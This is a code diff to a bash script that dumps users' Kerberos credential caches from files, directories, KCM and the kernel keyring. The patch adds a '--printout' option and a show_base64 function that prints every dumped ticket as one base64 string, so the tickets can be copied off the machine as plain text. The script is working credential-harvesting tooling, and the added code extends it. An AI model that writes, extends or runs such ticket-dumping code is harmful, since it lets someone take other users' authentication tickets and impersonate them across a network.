@@ -16,7 +16,11 @@ print_msg() {
     timestamp=$(date '+%Y-%m-%d %H:%M:%S')
     local level="$1"
     local msg="$2"
-    # suppress DEBUG messages unless VERBOSE enabled
+    # suppress PRINTOUT messages unless PRINTOUT enabled
+    if [[ "$level" == "PRINTOUT" && "${PRINTOUT:-0}" -ne 1 ]]; then
+        return
+    fi
+    # suppress VERBOSE messages unless VERBOSE enabled
     if [[ "$level" == "DEBUG" && "${VERBOSE:-0}" -ne 1 ]]; then
         return
     fi
@@ -26,6 +30,7 @@ print_msg() {
         WARN)    echo -e "\e[33m[WARN] [$timestamp] $msg\e[0m" ;;
         ERROR)   echo -e "\e[31m[ERROR] [$timestamp] $msg\e[0m" ;;
         SUCCESS) echo -e "\e[32m[SUCCESS] [$timestamp] $msg\e[0m" ;;
+        PRINTOUT)    echo -e "\e[35m[PRINTOUT] [$timestamp] $msg\e[0m" ;;
         *)       echo "$msg" ;;
     esac
 }
@@ -44,6 +49,36 @@ sanitize_name() {
     local s="$1"
     # replace problematic chars with underscore and keep only a safe charset
     printf "%s" "$s" | tr '/:@ ' '___' | tr -cd 'A-Za-z0-9._-'
+}
+
+# Show a file's content as base64
+show_base64() {
+    local file="$1"
+    if [ -z "$file" ]; then
+        print_msg DEBUG "show_base64: no file specified"
+        return 1
+    fi
+    if [ ! -f "$file" ]; then
+        print_msg DEBUG "show_base64: file not found: $file"
+        return 2
+    fi
+    local b64=""
+    if command -v base64 >/dev/null 2>&1; then
+        # try GNU base64 -w0, fall back to plain base64
+        b64=$(base64 -w0 "$file" 2>/dev/null || base64 "$file" 2>/dev/null | tr -d '\n' || true)
+    elif command -v openssl >/dev/null 2>&1; then
+        b64=$(openssl base64 -in "$file" 2>/dev/null | tr -d '\n' || true)
+    elif command -v python3 >/dev/null 2>&1; then
+        b64=$(python3 -c 'import sys,base64; print(base64.b64encode(open(sys.argv[1],"rb").read()).decode())' "$file" 2>/dev/null || true)
+    else
+        print_msg DEBUG "show_base64: no base64 encoder available"
+        return 3
+    fi
+    if [ -n "$b64" ]; then
+        print_msg PRINTOUT "Displaying content of ticket $file : $b64"
+    else
+        print_msg DEBUG "show_base64: base64 output empty for $file"
+    fi
 }
 
 # Return next available outfile path for a base and extension
@@ -78,6 +113,10 @@ while [[ $# -gt 0 ]]; do
         ;;
         -v|--verbose)
             VERBOSE=1
+            shift 1
+        ;;
+        -p|--printout)
+            PRINTOUT=1
             shift 1
         ;;
         dump)
@@ -213,6 +252,7 @@ dump_file() {
     
     if mv -- "$tmpfile" "$outfile" 2>/dev/null; then
         print_msg SUCCESS "Dumped $user ccache -> $outfile"
+        show_base64 "$outfile"
     else
         print_msg ERROR "Failed to move $tmpfile -> $outfile"
         rm -f "$tmpfile" || true
@@ -280,6 +320,7 @@ dump_dir() {
     
     if mv -- "$tmpfile" "$outfile" 2>/dev/null; then
         print_msg SUCCESS "Dumped $user ccache -> $outfile"
+        show_base64 "$outfile"
     else
         print_msg ERROR "Failed to move $tmpfile -> $outfile"
         rm -f "$tmpfile" || true
@@ -547,6 +588,7 @@ dump_kcm() {
             outfile=$(next_outfile "$base" ".ccache")
             if mv -- "$tmpfile" "$outfile" 2>/dev/null; then
                 print_msg SUCCESS "Dumped $user ccache -> $outfile"
+                show_base64 "$outfile"
             else
                 print_msg ERROR "Failed to move $tmpfile -> $outfile"
                 rm -f "$tmpfile" || true
@@ -641,6 +683,7 @@ dump_keyring() {
     # Write binary ccache file
     hex_to_bin "$HEX" > "$outfile"
     print_msg SUCCESS "Dumped $user ccache -> $outfile"
+    show_base64 "$outfile"
     
     return 0
 }
@@ -747,6 +790,7 @@ dump_all() {
 
         if cp -- "$f" "$outfile" 2>/dev/null; then
             print_msg SUCCESS "Dumped $f -> $outfile"
+            show_base64 "$outfile"
         else
             print_msg ERROR "Failed to copy $f -> $outfile"
         fi
